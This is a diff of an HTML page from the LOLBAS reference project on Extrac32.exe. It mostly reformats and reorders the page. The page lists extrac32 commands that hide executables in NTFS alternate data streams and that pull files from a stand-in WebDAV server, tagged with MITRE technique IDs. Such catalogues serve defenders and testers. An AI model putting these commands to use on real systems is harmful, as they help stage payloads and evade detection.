@@ -28,16 +28,20 @@
     </div>
 </h1>
 
-
 <ul class="function-list">
-    
-    
-    <li><a href="/lolbas/Binaries/Extrac32/#download">Download</a></li>
-    
-    
-    <li><a href="/lolbas/Binaries/Extrac32/#ads">Alternate data streams</a></li>
-    
+	
+	
+	
+	<li><a href="/lolbas/Binaries/Extrac32/#ads">Alternate data streams</a></li>
+	
+	
+	<li><a href="/lolbas/Binaries/Extrac32/#download">Download</a></li>
+	
 </ul>
+
+	
+
+
 
 
 
@@ -53,110 +57,93 @@
 </p>
 <br>
 <b>Resources:</b> 	
-	<ul style="list-style-type:none">
+<br>
 	
-	<li><a href="https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/">https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/</a></li>
+	<a href="https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/">https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/</a>
+	<br>
 	
-	<li><a href="https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f">https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f</a></li>
+	<a href="https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f">https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f</a>
+	<br>
 	
-	<li><a href="https://twitter.com/egre55/status/985994639202283520">https://twitter.com/egre55/status/985994639202283520</a></li>
+	<a href="https://twitter.com/egre55/status/985994639202283520">https://twitter.com/egre55/status/985994639202283520</a>
+	<br>
 	 
-	</ul>
 <br>
 <p><b>Acknowledgement:</b> 
-	<ul style="list-style-type:none">
+<br>
 	
-	<li>egre55 - <a href="https://twitter.com/@egre55">@egre55</a </li>
+	egre55 - <a href="https://twitter.com/@egre55">@egre55</a>
+	<br>
 	
-	<li>Oddvar Moe - <a href="https://twitter.com/@oddvarmoe">@oddvarmoe</a </li>
+	Oddvar Moe - <a href="https://twitter.com/@oddvarmoe">@oddvarmoe</a>
+	<br>
 	 
-	</ul>
 </p>
 <br>
-<p><b>Detection:</b> 
-	<ul style="list-style-type:none">
+<p><b>Detection:</b>
+<br>
 	
-	<li></li>
+	
+	<br>
 	 
-	</ul>
 </p>
 <br>
 <br>
 
 
 
+	
+<h2 id="ads" class ="function-name">Alternate data streams</h2>
+	
+		Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file.
+		<br>
+		<pre><code>extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe</code></pre>
+		Usecase:Extract data from cab file and hide it in an alternate data stream.
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file.
+		<br>
+		<pre><code>extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe</code></pre>
+		Usecase:Extract data from cab file and hide it in an alternate data stream.
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
-
-
-<h2 id="download" class="function-name">Download</h2>
-
-<p>The LOLBAS can download files.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Copy the source file to the destination file and overwrite it.</p>
-
+	
+<h2 id="download" class ="function-name">Download</h2>
+	
+		Copy the source file to the destination file and overwrite it.
+		<br>
+		<pre><code>extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt</code></pre>
 		Usecase:Download file from UNC/WEBDav
-        <pre><code>extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
-
-
-
-
-
-<h2 id="ads" class="function-name">Alternate data streams</h2>
-
-<p>The LOLBAS can write or read alternate data streams.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file.</p>
-
-		Usecase:Extract data from cab file and hide it in an alternate data stream.
-        <pre><code>extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a></li>
-	<br><br>	
-    
-
-
-
-    <li>
-        <p>Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file.</p>
-
-		Usecase:Extract data from cab file and hide it in an alternate data stream.
-        <pre><code>extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
         <script>
          // add permalink on headings
